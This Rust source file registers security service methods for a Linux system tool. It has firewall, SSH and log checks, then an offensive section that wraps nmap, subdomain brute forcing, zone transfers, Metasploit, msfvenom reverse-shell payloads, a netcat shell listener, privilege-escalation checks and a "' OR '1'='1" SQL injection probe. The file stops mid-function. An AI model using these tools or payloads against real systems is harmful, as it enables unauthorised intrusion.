use crate::services::ServiceRegistry;
use crate::utils::{process, storage};
use anyhow::Result;
use serde::{Deserialize, Serialize};
use serde_json;
use std::collections::HashMap;
use tokio::sync::RwLock;

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct FirewallRule {
    pub id: String,
    pub action: String,
    pub direction: String,
    pub protocol: String,
    pub port: Option<String>,
    pub source: Option<String>,
    pub destination: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SshConnection {
    pub user: String,
    pub host: String,
    pub port: u16,
    pub pid: u32,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SecurityLog {
    pub timestamp: String,
    pub level: String,
    pub message: String,
    pub source: String,
}

pub fn register(registry: &mut ServiceRegistry) {
    registry.register("Security.GetFirewallStatus", |_params| async move {
        // Try ufw first
        if let Ok(output) = process::exec_command(&["ufw", "status"]).await {
            let enabled = output.contains("Status: active");
            Ok(serde_json::json!({
                "enabled": enabled,
                "type": "ufw"
            }))
        } else if let Ok(output) = process::exec_command(&["firewall-cmd", "--state"]).await {
            let enabled = output.trim() == "running";
            Ok(serde_json::json!({
                "enabled": enabled,
                "type": "firewalld"
            }))
        } else {
            Ok(serde_json::json!({
                "enabled": false,
                "type": "none"
            }))
        }
    });

    registry.register("Security.EnableFirewall", |_params| async move {
        // Try ufw first
        if process::exec_command(&["ufw", "enable"]).await.is_ok() {
            Ok(serde_json::json!({ "success": true }))
        } else if process::exec_command(&["systemctl", "start", "firewalld"]).await.is_ok() {
            Ok(serde_json::json!({ "success": true }))
        } else {
            anyhow::bail!("Failed to enable firewall")
        }
    });

    registry.register("Security.DisableFirewall", |_params| async move {
        if process::exec_command(&["ufw", "disable"]).await.is_ok() {
            Ok(serde_json::json!({ "success": true }))
        } else if process::exec_command(&["systemctl", "stop", "firewalld"]).await.is_ok() {
            Ok(serde_json::json!({ "success": true }))
        } else {
            anyhow::bail!("Failed to disable firewall")
        }
    });

    registry.register("Security.GetFirewallRules", |_params| async move {
        let mut rules = Vec::new();

        if let Ok(output) = process::exec_command(&["ufw", "status", "numbered"]).await {
            for (i, line) in output.lines().enumerate() {
                if line.contains("ALLOW") || line.contains("DENY") || line.contains("REJECT") {
                    let parts: Vec<&str> = line.split_whitespace().collect();
                    if parts.len() >= 3 {
                        rules.push(FirewallRule {
                            id: i.to_string(),
                            action: parts[0].to_string(),
                            direction: parts[1].to_string(),
                            protocol: parts[2].to_string(),
                            port: parts.get(3).map(|s| s.to_string()),
                            source: None,
                            destination: None,
                        });
                    }
                }
            }
        }

        Ok(serde_json::to_value(&rules)?)
    });

    registry.register("Security.AddFirewallRule", |params| async move {
        let rule: FirewallRule = serde_json::from_value(
            params
                .as_ref()
                .and_then(|p| p.get("rule").cloned())
                .ok_or_else(|| anyhow::anyhow!("Missing rule"))?,
        )?;

        let mut cmd = vec!["ufw"];
        cmd.push(&rule.action);
        cmd.push(&rule.direction);
        if let Some(ref port) = rule.port {
            cmd.push(port);
        }
        if let Some(ref source) = rule.source {
            cmd.push("from");
            cmd.push(source);
        }

        process::exec_command(&cmd).await?;
        Ok(serde_json::json!({ "success": true }))
    });

    registry.register("Security.RemoveFirewallRule", |params| async move {
        let rule_id: String = serde_json::from_value(
            params
                .as_ref()
                .and_then(|p| p.get("rule_id").cloned())
                .ok_or_else(|| anyhow::anyhow!("Missing rule_id"))?,
        )?;

        process::exec_command(&["ufw", "delete", &rule_id]).await?;
        Ok(serde_json::json!({ "success": true }))
    });

    registry.register("Security.GetSshStatus", |_params| async move {
        let output = process::exec_command(&["systemctl", "is-active", "sshd"]).await?;
        let active = output.trim() == "active";

        Ok(serde_json::json!({
            "active": active,
            "enabled": process::exec_command(&["systemctl", "is-enabled", "sshd"]).await.ok().map(|o| o.trim() == "enabled").unwrap_or(false)
        }))
    });

    registry.register("Security.GetSshConnections", |_params| async move {
        let output = process::exec_command(&["ss", "-tnp"]).await?;
        let mut connections = Vec::new();

        for line in output.lines() {
            if line.contains(":22") || line.contains("ssh") {
                let parts: Vec<&str> = line.split_whitespace().collect();
                if parts.len() >= 5 {
                    if let Some(addr) = parts.get(4) {
                        if let Some((host, port)) = addr.split_once(':') {
                            if let Ok(port_num) = port.parse::<u16>() {
                                connections.push(SshConnection {
                                    user: "unknown".to_string(),
                                    host: host.to_string(),
                                    port: port_num,
                                    pid: 0,
                                });
                            }
                        }
                    }
                }
            }
        }

        Ok(serde_json::to_value(&connections)?)
    });

    registry.register("Security.GetFailedLogins", |_params| async move {
        let mut logs = Vec::new();

        // Try /var/log/auth.log (Debian/Ubuntu)
        if let Ok(output) = process::exec_command(&["grep", "Failed password", "/var/log/auth.log"]).await {
            for line in output.lines() {
                logs.push(SecurityLog {
                    timestamp: "unknown".to_string(),
                    level: "warning".to_string(),
                    message: line.to_string(),
                    source: "auth.log".to_string(),
                });
            }
        }

        // Try /var/log/secure (RHEL/CentOS)
        if let Ok(output) = process::exec_command(&["grep", "Failed password", "/var/log/secure"]).await {
            for line in output.lines() {
                logs.push(SecurityLog {
                    timestamp: "unknown".to_string(),
                    level: "warning".to_string(),
                    message: line.to_string(),
                    source: "secure".to_string(),
                });
            }
        }

        Ok(serde_json::to_value(&logs)?)
    });

    registry.register("Security.GetSudoLogs", |_params| async move {
        let output = process::exec_command(&["grep", "sudo", "/var/log/auth.log"]).await?;
        let mut logs = Vec::new();

        for line in output.lines() {
            logs.push(SecurityLog {
                timestamp: "unknown".to_string(),
                level: "info".to_string(),
                message: line.to_string(),
                source: "auth.log".to_string(),
            });
        }

        Ok(serde_json::to_value(&logs)?)
    });

    registry.register("Security.ScanPorts", |_params| async move {
        let output = process::exec_command(&["ss", "-tuln"]).await?;
        let mut ports = Vec::new();

        for line in output.lines().skip(1) {
            let parts: Vec<&str> = line.split_whitespace().collect();
            if parts.len() >= 5 {
                if let Some(addr) = parts.get(4) {
                    if let Some((_, port)) = addr.rsplit_once(':') {
                        ports.push(port.to_string());
                    }
                }
            }
        }

        Ok(serde_json::to_value(&ports)?)
    });

    registry.register("Security.GetEncryptionStatus", |_params| async move {
        let mut encrypted = false;
        let mut devices = Vec::new();

        if let Ok(output) = process::exec_command(&["lsblk", "-f"]).await {
            for line in output.lines() {
                if line.contains("crypto_LUKS") {
                    encrypted = true;
                    if let Some(device) = line.split_whitespace().next() {
                        devices.push(device.to_string());
                    }
                }
            }
        }

        Ok(serde_json::json!({
            "encrypted": encrypted,
            "devices": devices
        }))
    });

    registry.register("Security.GetKeyringStatus", |_params| async move {
        let available = process::exec_command(&["which", "secret-tool"]).await.is_ok();
        Ok(serde_json::json!({
            "available": available
        }))
    });

    registry.register("Security.GetCertificates", |_params| async move {
        let mut certs = Vec::new();

        // Check common certificate locations
        let home = std::env::var("HOME").unwrap_or_default();
        let cert_dirs: Vec<String> = vec![
            "/etc/ssl/certs".to_string(),
            "/usr/share/ca-certificates".to_string(),
            format!("{}/.local/share/certificates", home),
        ];

        for dir in &cert_dirs {
            if let Ok(entries) = tokio::fs::read_dir(&dir).await {
                let mut entries = entries;
                while let Ok(Some(entry)) = entries.next_entry().await {
                    if let Ok(file_name) = entry.file_name().into_string() {
                        if file_name.ends_with(".crt") || file_name.ends_with(".pem") {
                            certs.push(file_name);
                        }
                    }
                }
            }
        }

        Ok(serde_json::to_value(&certs)?)
    });

    registry.register("Security.GetVpnConnections", |_params| async move {
        // This would integrate with the VPN service
        // For now, check for active VPN processes
        let mut connections = Vec::new();

        if process::exec_command(&["pgrep", "openconnect"]).await.is_ok() {
            connections.push("OpenConnect".to_string());
        }
        if process::exec_command(&["pgrep", "openvpn"]).await.is_ok() {
            connections.push("OpenVPN".to_string());
        }

        Ok(serde_json::to_value(&connections)?)
    });

    // ========================================================================
    // OFFENSIVE SECURITY METHODS
    // ========================================================================

    register_offensive_security(registry);
}

lazy_static::lazy_static! {
    static ref NMAP_SCANS: RwLock<HashMap<String, NmapScanResult>> = RwLock::new(HashMap::new());
    static ref OFFENSIVE_SESSIONS: RwLock<HashMap<String, OffensiveSession>> = RwLock::new(HashMap::new());
    static ref ACTIVE_SHELLS: RwLock<HashMap<String, ShellSession>> = RwLock::new(HashMap::new());
}

#[derive(Debug, Clone, Serialize, Deserialize)]
struct NmapScanResult {
    scan_id: String,
    target: String,
    status: String,
    ports: Vec<NmapPort>,
    hosts: Vec<NmapHost>,
    output: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
struct NmapPort {
    port: u16,
    protocol: String,
    state: String,
    service: String,
    version: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
struct NmapHost {
    ip: String,
    hostname: Option<String>,
    os: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
struct OffensiveSession {
    session_id: String,
    name: String,
    target: String,
    created_at: i64,
    notes: Vec<String>,
    findings: Vec<Finding>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
struct Finding {
    id: String,
    title: String,
    description: String,
    severity: String,
    category: String,
    timestamp: i64,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
struct ShellSession {
    shell_id: String,
    host: String,
    port: u16,
    shell_type: String,
    active: bool,
}

fn register_offensive_security(registry: &mut ServiceRegistry) {
    // ========================================================================
    // 1. RECONNAISSANCE & INFORMATION GATHERING
    // ========================================================================

    // Nmap Integration
    registry.register("Security.Offensive.Nmap.Scan", |params| async move {
        let target: String = serde_json::from_value(
            params
                .as_ref()
                .and_then(|p| p.get("target").cloned())
                .ok_or_else(|| anyhow::anyhow!("Missing target"))?,
        )?;

        let scan_type: String = serde_json::from_value(
            params
                .as_ref()
                .and_then(|p| p.get("scan_type").cloned())
                .unwrap_or(serde_json::Value::String("syn".to_string())),
        )?;

        let ports: Option<String> = params
            .as_ref()
            .and_then(|p| p.get("ports").cloned())
            .and_then(|v| serde_json::from_value(v).ok());

        let options: Option<String> = params
            .as_ref()
            .and_then(|p| p.get("options").cloned())
            .and_then(|v| serde_json::from_value(v).ok());

        let scan_id = format!("scan_{}", chrono::Utc::now().timestamp_millis());
        let output_file = format!("/tmp/nmap_{}.xml", scan_id);

        let mut cmd = vec!["nmap"];
        match scan_type.as_str() {
            "syn" => cmd.push("-sS"),
            "udp" => cmd.push("-sU"),
            "full" => {
                cmd.push("-sS");
                cmd.push("-sV");
                cmd.push("-O");
            }
            _ => {}
        }

        if let Some(ref p) = ports {
            cmd.extend_from_slice(&["-p", p]);
        }

        cmd.extend_from_slice(&["-oX", &output_file]);
        if let Some(ref opts) = options {
            // Parse additional options
            for opt in opts.split_whitespace() {
                cmd.push(opt);
            }
        }
        cmd.push(&target);

        let output = process::exec_command(&cmd).await?;

        // Parse XML output
        let xml_content = tokio::fs::read_to_string(&output_file).await?;
        let ports = parse_nmap_xml(&xml_content)?;

        let result = NmapScanResult {
            scan_id: scan_id.clone(),
            target,
            status: "completed".to_string(),
            ports,
            hosts: Vec::new(),
            output,
        };

        let mut scans = NMAP_SCANS.write().await;
        scans.insert(scan_id.clone(), result.clone());

        Ok(serde_json::to_value(&result)?)
    });

    registry.register("Security.Offensive.Nmap.QuickScan", |params| async move {
        let target: String = serde_json::from_value(
            params
                .as_ref()
                .and_then(|p| p.get("target").cloned())
                .ok_or_else(|| anyhow::anyhow!("Missing target"))?,
        )?;

        let scan_id = format!("scan_{}", chrono::Utc::now().timestamp_millis());
        let output_file = format!("/tmp/nmap_{}.xml", scan_id);

        let output = process::exec_command(&[
            "nmap",
            "-F",
            "-sS",
            "-oX",
            &output_file,
            &target,
        ])
        .await?;

        let xml_content = tokio::fs::read_to_string(&output_file).await?;
        let ports = parse_nmap_xml(&xml_content)?;

        let result = NmapScanResult {
            scan_id: scan_id.clone(),
            target,
            status: "completed".to_string(),
            ports,
            hosts: Vec::new(),
            output,
        };

        let mut scans = NMAP_SCANS.write().await;
        scans.insert(scan_id.clone(), result.clone());

        Ok(serde_json::to_value(&result)?)
    });

    registry.register("Security.Offensive.Nmap.FullScan", |params| async move {
        let target: String = serde_json::from_value(
            params
                .as_ref()
                .and_then(|p| p.get("target").cloned())
                .ok_or_else(|| anyhow::anyhow!("Missing target"))?,
        )?;

        let scan_id = format!("scan_{}", chrono::Utc::now().timestamp_millis());
        let output_file = format!("/tmp/nmap_{}.xml", scan_id);

        let output = process::exec_command(&[
            "nmap",
            "-sS",
            "-sV",
            "-O",
            "-A",
            "-oX",
            &output_file,
            &target,
        ])
        .await?;

        let xml_content = tokio::fs::read_to_string(&output_file).await?;
        let ports = parse_nmap_xml(&xml_content)?;

        let result = NmapScanResult {
            scan_id: scan_id.clone(),
            target,
            status: "completed".to_string(),
            ports,
            hosts: Vec::new(),
            output,
        };

        let mut scans = NMAP_SCANS.write().await;
        scans.insert(scan_id.clone(), result.clone());

        Ok(serde_json::to_value(&result)?)
    });

    registry.register("Security.Offensive.Nmap.ScanResults", |params| async move {
        let scan_id: String = serde_json::from_value(
            params
                .as_ref()
                .and_then(|p| p.get("scan_id").cloned())
                .ok_or_else(|| anyhow::anyhow!("Missing scan_id"))?,
        )?;

        let scans = NMAP_SCANS.read().await;
        if let Some(result) = scans.get(&scan_id) {
            Ok(serde_json::to_value(result)?)
        } else {
            anyhow::bail!("Scan not found")
        }
    });

    registry.register("Security.Offensive.Nmap.SaveResults", |params| async move {
        let scan_id: String = serde_json::from_value(
            params
                .as_ref()
                .and_then(|p| p.get("scan_id").cloned())
                .ok_or_else(|| anyhow::anyhow!("Missing scan_id"))?,
        )?;

        let format: String = serde_json::from_value(
            params
                .as_ref()
                .and_then(|p| p.get("format").cloned())
                .unwrap_or(serde_json::Value::String("json".to_string())),
        )?;

        let scans = NMAP_SCANS.read().await;
        if let Some(result) = scans.get(&scan_id) {
            match format.as_str() {
                "json" => Ok(serde_json::to_value(result)?),
                "xml" => {
                    let xml_file = format!("/tmp/nmap_{}.xml", scan_id);
                    if let Ok(content) = tokio::fs::read_to_string(&xml_file).await {
                        Ok(serde_json::json!({ "xml": content }))
                    } else {
                        anyhow::bail!("XML file not found")
                    }
                }
                _ => anyhow::bail!("Unsupported format")
            }
        } else {
            anyhow::bail!("Scan not found")
        }
    });

    // Subdomain Enumeration
    registry.register("Security.Offensive.Subdomain.Enumerate", |params| async move {
        let domain: String = serde_json::from_value(
            params
                .as_ref()
                .and_then(|p| p.get("domain").cloned())
                .ok_or_else(|| anyhow::anyhow!("Missing domain"))?,
        )?;

        let tools: Option<Vec<String>> = params
            .as_ref()
                .and_then(|p| p.get("tools").cloned())
                .and_then(|v| serde_json::from_value(v).ok());

        let mut subdomains = Vec::new();

        // Try sublist3r
        if tools.as_ref().map(|t| t.contains(&"sublist3r".to_string())).unwrap_or(true) {
            if let Ok(output) = process::exec_command(&["sublist3r", "-d", &domain]).await {
                for line in output.lines() {
                    if !line.trim().is_empty() && line.contains(&domain) {
                        subdomains.push(line.trim().to_string());
                    }
                }
            }
        }

        // Try amass
        if tools.as_ref().map(|t| t.contains(&"amass".to_string())).unwrap_or(false) {
            if let Ok(output) = process::exec_command(&["amass", "enum", "-d", &domain]).await {
                for line in output.lines() {
                    if !line.trim().is_empty() {
                        subdomains.push(line.trim().to_string());
                    }
                }
            }
        }

        Ok(serde_json::to_value(&subdomains)?)
    });

    registry.register("Security.Offensive.Subdomain.BruteForce", |params| async move {
        let domain: String = serde_json::from_value(
            params
                .as_ref()
                .and_then(|p| p.get("domain").cloned())
                .ok_or_else(|| anyhow::anyhow!("Missing domain"))?,
        )?;

        let wordlist: String = serde_json::from_value(
            params
                .as_ref()
                .and_then(|p| p.get("wordlist").cloned())
                .ok_or_else(|| anyhow::anyhow!("Missing wordlist"))?,
        )?;

        let output = process::exec_command(&["dnsrecon", "-d", &domain, "-D", &wordlist, "-t", "brt"]).await?;
        let mut subdomains = Vec::new();

        for line in output.lines() {
            if line.contains("A") && line.contains(&domain) {
                if let Some(parts) = line.split_whitespace().next() {
                    subdomains.push(parts.to_string());
                }
            }
        }

        Ok(serde_json::to_value(&subdomains)?)
    });

    registry.register("Security.Offensive.Subdomain.CertificateTransparency", |params| async move {
        let domain: String = serde_json::from_value(
            params
                .as_ref()
                .and_then(|p| p.get("domain").cloned())
                .ok_or_else(|| anyhow::anyhow!("Missing domain"))?,
        )?;

        // Use crt.sh API
        let url = format!("https://crt.sh/?q={}&output=json", domain);
        let response = reqwest::get(&url).await?;
        let json: Vec<serde_json::Value> = response.json().await?;

        let mut subdomains = Vec::new();
        for entry in json {
            if let Some(name) = entry.get("name_value").and_then(|v| v.as_str()) {
                subdomains.push(name.to_string());
            }
        }

        Ok(serde_json::to_value(&subdomains)?)
    });

    // DNS Enumeration
    registry.register("Security.Offensive.DNS.ZoneTransfer", |params| async move {
        let domain: String = serde_json::from_value(
            params
                .as_ref()
                .and_then(|p| p.get("domain").cloned())
                .ok_or_else(|| anyhow::anyhow!("Missing domain"))?,
        )?;

        let output = process::exec_command(&["dig", "axfr", &domain]).await?;
        Ok(serde_json::json!({ "output": output }))
    });

    registry.register("Security.Offensive.DNS.ReverseLookup", |params| async move {
        let ip_range: String = serde_json::from_value(
            params
                .as_ref()
                .and_then(|p| p.get("ip_range").cloned())
                .ok_or_else(|| anyhow::anyhow!("Missing ip_range"))?,
        )?;

        let output = process::exec_command(&["nmap", "-sL", &ip_range]).await?;
        Ok(serde_json::json!({ "output": output }))
    });

    registry.register("Security.Offensive.DNS.Query", |params| async move {
        let domain: String = serde_json::from_value(
            params
                .as_ref()
                .and_then(|p| p.get("domain").cloned())
                .ok_or_else(|| anyhow::anyhow!("Missing domain"))?,
        )?;

        let record_type: String = serde_json::from_value(
            params
                .as_ref()
                .and_then(|p| p.get("record_type").cloned())
                .unwrap_or(serde_json::Value::String("A".to_string())),
        )?;

        let output = process::exec_command(&["dig", &record_type, &domain]).await?;
        Ok(serde_json::json!({ "output": output }))
    });

    // Port Scanning
    registry.register("Security.Offensive.PortScan.TcpSyn", |params| async move {
        let target: String = serde_json::from_value(
            params
                .as_ref()
                .and_then(|p| p.get("target").cloned())
                .ok_or_else(|| anyhow::anyhow!("Missing target"))?,
        )?;

        let ports: Option<String> = params
            .as_ref()
                .and_then(|p| p.get("ports").cloned())
                .and_then(|v| serde_json::from_value(v).ok());

        let mut cmd = vec!["nmap", "-sS"];
        if let Some(ref p) = ports {
            cmd.extend_from_slice(&["-p", p]);
        }
        cmd.push(&target);

        let output = process::exec_command(&cmd).await?;
        Ok(serde_json::json!({ "output": output }))
    });

    registry.register("Security.Offensive.PortScan.Udp", |params| async move {
        let target: String = serde_json::from_value(
            params
                .as_ref()
                .and_then(|p| p.get("target").cloned())
                .ok_or_else(|| anyhow::anyhow!("Missing target"))?,
        )?;

        let ports: Option<String> = params
            .as_ref()
                .and_then(|p| p.get("ports").cloned())
                .and_then(|v| serde_json::from_value(v).ok());

        let mut cmd = vec!["nmap", "-sU"];
        if let Some(ref p) = ports {
            cmd.extend_from_slice(&["-p", p]);
        }
        cmd.push(&target);

        let output = process::exec_command(&cmd).await?;
        Ok(serde_json::json!({ "output": output }))
    });

    registry.register("Security.Offensive.PortScan.ServiceVersion", |params| async move {
        let target: String = serde_json::from_value(
            params
                .as_ref()
                .and_then(|p| p.get("target").cloned())
                .ok_or_else(|| anyhow::anyhow!("Missing target"))?,
        )?;

        let ports: Option<String> = params
            .as_ref()
                .and_then(|p| p.get("ports").cloned())
                .and_then(|v| serde_json::from_value(v).ok());

        let mut cmd = vec!["nmap", "-sV"];
        if let Some(ref p) = ports {
            cmd.extend_from_slice(&["-p", p]);
        }
        cmd.push(&target);

        let output = process::exec_command(&cmd).await?;
        Ok(serde_json::json!({ "output": output }))
    });

    registry.register("Security.Offensive.PortScan.OsDetection", |params| async move {
        let target: String = serde_json::from_value(
            params
                .as_ref()
                .and_then(|p| p.get("target").cloned())
                .ok_or_else(|| anyhow::anyhow!("Missing target"))?,
        )?;

        let output = process::exec_command(&["nmap", "-O", &target]).await?;
        Ok(serde_json::json!({ "output": output }))
    });

    // Web Reconnaissance
    registry.register("Security.Offensive.Web.TechStack", |params| async move {
        let url: String = serde_json::from_value(
            params
                .as_ref()
                .and_then(|p| p.get("url").cloned())
                .ok_or_else(|| anyhow::anyhow!("Missing url"))?,
        )?;

        // Use whatweb or wappalyzer
        let output = process::exec_command(&["whatweb", &url]).await?;
        Ok(serde_json::json!({ "output": output }))
    });

    registry.register("Security.Offensive.Web.DirectoryBruteForce", |params| async move {
        let url: String = serde_json::from_value(
            params
                .as_ref()
                .and_then(|p| p.get("url").cloned())
                .ok_or_else(|| anyhow::anyhow!("Missing url"))?,
        )?;

        let wordlist: String = serde_json::from_value(
            params
                .as_ref()
                .and_then(|p| p.get("wordlist").cloned())
                .ok_or_else(|| anyhow::anyhow!("Missing wordlist"))?,
        )?;

        // Try gobuster first, fallback to dirb
        let output = if process::exec_command(&["which", "gobuster"]).await.is_ok() {
            process::exec_command(&["gobuster", "dir", "-u", &url, "-w", &wordlist]).await?
        } else {
            process::exec_command(&["dirb", &url, &wordlist]).await?
        };

        Ok(serde_json::json!({ "output": output }))
    });

    registry.register("Security.Offensive.Web.Screenshot", |params| async move {
        let urls: Vec<String> = serde_json::from_value(
            params
                .as_ref()
                .and_then(|p| p.get("urls").cloned())
                .ok_or_else(|| anyhow::anyhow!("Missing urls"))?,
        )?;

        let mut screenshots = Vec::new();
        for url in urls {
            let output_file = format!("/tmp/screenshot_{}.png", chrono::Utc::now().timestamp_millis());
            if process::exec_command(&["cutycapt", "--url", &url, "--out", &output_file]).await.is_ok() {
                screenshots.push(output_file);
            }
        }

        Ok(serde_json::to_value(&screenshots)?)
    });

    // OSINT
    registry.register("Security.Offensive.OSINT.Email", |params| async move {
        let email: String = serde_json::from_value(
            params
                .as_ref()
                .and_then(|p| p.get("email").cloned())
                .ok_or_else(|| anyhow::anyhow!("Missing email"))?,
        )?;

        // Check haveibeenpwned
        let url = format!("https://haveibeenpwned.com/api/v3/breachedaccount/{}", email);
        let client = reqwest::Client::new();
        let response = client.get(&url).send().await.ok();

        let mut result = serde_json::json!({
            "email": email,
            "breaches": []
        });

        if let Some(resp) = response {
            if resp.status().is_success() {
                if let Ok(breaches) = resp.json::<Vec<serde_json::Value>>().await {
                    result["breaches"] = serde_json::json!(breaches);
                }
            }
        }

        Ok(result)
    });

    registry.register("Security.Offensive.OSINT.IP", |params| async move {
        let ip: String = serde_json::from_value(
            params
                .as_ref()
                .and_then(|p| p.get("ip").cloned())
                .ok_or_else(|| anyhow::anyhow!("Missing ip"))?,
        )?;

        // Use ipinfo.io
        let url = format!("https://ipinfo.io/{}/json", ip);
        let response = reqwest::get(&url).await?;
        let json: serde_json::Value = response.json().await?;

        Ok(json)
    });

    registry.register("Security.Offensive.OSINT.Domain", |params| async move {
        let domain: String = serde_json::from_value(
            params
                .as_ref()
                .and_then(|p| p.get("domain").cloned())
                .ok_or_else(|| anyhow::anyhow!("Missing domain"))?,
        )?;

        let whois_output = process::exec_command(&["whois", &domain]).await?;
        Ok(serde_json::json!({ "whois": whois_output }))
    });

    // ========================================================================
    // 2. VULNERABILITY ASSESSMENT
    // ========================================================================

    registry.register("Security.Offensive.VulnScan.NmapScripts", |params| async move {
        let target: String = serde_json::from_value(
            params
                .as_ref()
                .and_then(|p| p.get("target").cloned())
                .ok_or_else(|| anyhow::anyhow!("Missing target"))?,
        )?;

        let script_category: Option<String> = params
            .as_ref()
                .and_then(|p| p.get("script_category").cloned())
                .and_then(|v| serde_json::from_value(v).ok());

        let mut cmd = vec!["nmap", "--script"];
        if let Some(ref cat) = script_category {
            cmd.push(cat);
        } else {
            cmd.push("vuln");
        }
        cmd.push(&target);

        let output = process::exec_command(&cmd).await?;
        Ok(serde_json::json!({ "output": output }))
    });

    registry.register("Security.Offensive.ExploitDB.Search", |params| async move {
        let query: String = serde_json::from_value(
            params
                .as_ref()
                .and_then(|p| p.get("query").cloned())
                .ok_or_else(|| anyhow::anyhow!("Missing query"))?,
        )?;

        let platform: Option<String> = params
            .as_ref()
                .and_then(|p| p.get("platform").cloned())
                .and_then(|v| serde_json::from_value(v).ok());

        let _exploit_type: Option<String> = params
            .as_ref()
                .and_then(|p| p.get("type").cloned())
                .and_then(|v| serde_json::from_value(v).ok());

        // Use searchsploit
        let mut cmd = vec!["searchsploit", "--json", &query];
        if let Some(ref p) = platform {
            cmd.extend_from_slice(&["-p", p]);
        }

        let output = process::exec_command(&cmd).await?;
        Ok(serde_json::json!({ "output": output }))
    });

    registry.register("Security.Offensive.ExploitDB.GetExploit", |params| async move {
        let exploit_id: String = serde_json::from_value(
            params
                .as_ref()
                .and_then(|p| p.get("exploit_id").cloned())
                .ok_or_else(|| anyhow::anyhow!("Missing exploit_id"))?,
        )?;

        let output = process::exec_command(&["searchsploit", "-x", &exploit_id]).await?;
        Ok(serde_json::json!({ "output": output }))
    });

    registry.register("Security.Offensive.CVE.Search", |params| async move {
        let cve_id: String = serde_json::from_value(
            params
                .as_ref()
                .and_then(|p| p.get("cve_id").cloned())
                .ok_or_else(|| anyhow::anyhow!("Missing cve_id"))?,
        )?;

        let url = format!("https://cve.circl.lu/api/cve/{}", cve_id);
        let response = reqwest::get(&url).await?;
        let json: serde_json::Value = response.json().await?;

        Ok(json)
    });

    // ========================================================================
    // 3. EXPLOITATION TOOLS
    // ========================================================================

    registry.register("Security.Offensive.Metasploit.Connect", |_params| async move {
        // Check if msfrpcd is running, if not start it
        if process::exec_command(&["pgrep", "msfrpcd"]).await.is_err() {
            process::exec_command_detached(&["msfrpcd", "-P", "password", "-a", "127.0.0.1"]).await.ok();
        }
        Ok(serde_json::json!({ "connected": true }))
    });

    registry.register("Security.Offensive.Metasploit.SearchExploit", |params| async move {
        let query: String = serde_json::from_value(
            params
                .as_ref()
                .and_then(|p| p.get("query").cloned())
                .ok_or_else(|| anyhow::anyhow!("Missing query"))?,
        )?;

        let output = process::exec_command(&["msfconsole", "-q", "-x", &format!("search {}", query)]).await?;
        Ok(serde_json::json!({ "output": output }))
    });

    registry.register("Security.Offensive.Payload.Msvenom", |params| async move {
        let payload_type: String = serde_json::from_value(
            params
                .as_ref()
                .and_then(|p| p.get("type").cloned())
                .ok_or_else(|| anyhow::anyhow!("Missing type"))?,
        )?;

        let lhost: String = serde_json::from_value(
            params
                .as_ref()
                .and_then(|p| p.get("lhost").cloned())
                .ok_or_else(|| anyhow::anyhow!("Missing lhost"))?,
        )?;

        let lport: u16 = serde_json::from_value(
            params
                .as_ref()
                .and_then(|p| p.get("lport").cloned())
                .ok_or_else(|| anyhow::anyhow!("Missing lport"))?,
        )?;

        let format: Option<String> = params
            .as_ref()
                .and_then(|p| p.get("format").cloned())
                .and_then(|v| serde_json::from_value(v).ok());

        let encoder: Option<String> = params
            .as_ref()
                .and_then(|p| p.get("encoder").cloned())
                .and_then(|v| serde_json::from_value(v).ok());

        let lport_str = lport.to_string();
        let mut cmd = vec!["msfvenom", "-p", &payload_type, "LHOST", &lhost, "LPORT", &lport_str];
        if let Some(ref f) = format {
            cmd.extend_from_slice(&["-f", f]);
        }
        if let Some(ref e) = encoder {
            cmd.extend_from_slice(&["-e", e]);
        }

        let output = process::exec_command(&cmd).await?;
        Ok(serde_json::json!({ "payload": output }))
    });

    registry.register("Security.Offensive.Shell.Listen", |params| async move {
        let port: u16 = serde_json::from_value(
            params
                .as_ref()
                .and_then(|p| p.get("port").cloned())
                .ok_or_else(|| anyhow::anyhow!("Missing port"))?,
        )?;

        let shell_type: String = serde_json::from_value(
            params
                .as_ref()
                .and_then(|p| p.get("type").cloned())
                .unwrap_or(serde_json::Value::String("nc".to_string())),
        )?;

        let shell_id = format!("shell_{}", chrono::Utc::now().timestamp_millis());

        match shell_type.as_str() {
            "nc" | "netcat" => {
                process::exec_command_detached(&["nc", "-lvp", &port.to_string()]).await.ok();
            }
            _ => {}
        }

        let session = ShellSession {
            shell_id: shell_id.clone(),
            host: "0.0.0.0".to_string(),
            port,
            shell_type,
            active: true,
        };

        let mut shells = ACTIVE_SHELLS.write().await;
        shells.insert(shell_id.clone(), session.clone());

        Ok(serde_json::to_value(&session)?)
    });

    // ========================================================================
    // 4. POST-EXPLOITATION
    // ========================================================================

    registry.register("Security.Offensive.PrivEsc.Check", |_params| async move {
        // Run linpeas or similar
        let output = if process::exec_command(&["which", "linpeas.sh"]).await.is_ok() {
            process::exec_command(&["linpeas.sh"]).await?
        } else {
            // Fallback to manual checks
            let mut results = Vec::new();

            // Check sudo
            if let Ok(sudo_output) = process::exec_command(&["sudo", "-l"]).await {
                results.push(format!("Sudo permissions: {}", sudo_output));
            }

            // Check SUID
            if let Ok(suid_output) = process::exec_command(&["find", "/usr", "-perm", "-4000", "-type", "f", "2>/dev/null"]).await {
                results.push(format!("SUID binaries: {}", suid_output));
            }

            results.join("\n")
        };

        Ok(serde_json::json!({ "output": output }))
    });

    // ========================================================================
    // 5. WEB APPLICATION SECURITY
    // ========================================================================

    registry.register("Security.Offensive.Web.SQLi.Test", |params| async move {
        let url: String = serde_json::from_value(
            params
                .as_ref()
                .and_then(|p| p.get("url").cloned())
                .ok_or_else(|| anyhow::anyhow!("Missing url"))?,
        )?;

        let parameter: String = serde_json::from_value(
            params
                .as_ref()
                .and_then(|p| p.get("parameter").cloned())
                .ok_or_else(|| anyhow::anyhow!("Missing parameter"))?,
        )?;

        // Simple SQL injection test
        let test_payload = "' OR '1'='1";
        let test_url = format!("{}?{}={}", url, parameter, test_payload);
        let response = reqwest::get(&test_url).await?;
        let status = response.status().as_u16();

        Ok(serde_json::json!({
            "vulnerable": status == 200,
            "status": status
        }))
    });

    registry.register("Security.Offensive.Web.SQLi.Sqlmap", |params| async move {
        let url: String = serde_json::from_value(
            params
                .as_ref()
                .and_then(|p| p.get("url").cloned())
                .ok_or_else(|| anyhow::anyhow!("Missing url"))?,
